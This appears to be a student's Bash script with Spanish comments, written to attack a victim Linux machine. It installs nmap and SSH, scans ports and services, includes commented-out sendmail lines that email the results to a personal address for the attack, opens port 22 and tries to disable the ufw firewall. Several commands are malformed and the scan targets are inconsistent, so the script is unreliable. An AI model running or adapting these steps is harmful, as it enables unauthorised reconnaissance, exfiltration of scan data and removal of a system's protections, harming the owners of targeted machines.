 sudo apt install nmap -y
#le obligamos a instalar nmap para descubrir que puertos tiene vulnerable y servicios en ellos 

sudo apt install ssh -y
#le instalamos ssh para poder conectarnos a la máquina en vez de mandarlo por email

 #sudo apt install mailutils -y
 #le instalamos mailutils para poder mandar correos

 #sudo apt install postfix -y
  #le añadimos el postfix para poder mandar correos


 #sudo systemctl start postfix
 #iniciar servicio de postfix

# volvemos a añadir sudo ya que debe ser usado en máquina linux


touch resultado_nmap.txt
#le creamos un archivo de texto donde mandara los resultados de los puertos escaneados

touch servicios_detectados.txt
#le creamos un archivo de texto donde mandara los servicios que tiene abiertos

nmap -p 1-5000 127.0.0.1 -oN resultado_nmap.txt 
#le escaneamos los puertos del 1 al 5000
#le añadimos el archivo de texto donde mandara los resultados

nmap -sV -p$(cat resultado_nmap.txt | grep "open" | awk '{print $1}' | cut -d'/' -f1 | tr '\n' ',') 192.168.1.100 -oN servicios_detectados.txt
#le añadimos otro escaneo que nos muestre los servicios que tiene abiertos en los puertos que hemos encontrado

#sendmail richardo94ac@gmail.com < resultado_nmap.txt
#le añadimos que nos mande por correo los resultados para poder realizar el ataque. 

#sendmail richardo94ac@egmail.com < servicios_detectados.txt
#le añadimos que nos mande por correo los servicios que tiene abiertos en los puertos que hemos encontrado

#vemos dentro del archivo que nos hemos mandado que puertos tiene abiertos y que servicios en estos puertos

#con esta información ya podemos hacer un ataque a la máquina dependiendo de los servicios y puertos que tenga abiertos usando metasploitable o searchsploit

sudo ufw allow 22 
#abrimos el puerto de ssh 

sudo systemctl ufw disable
#intento de desactivarle el firewall para vulnerar la máquina

sudo service disable ufw 
#intento de desactivarle el firewall para vulnerar la máquina con service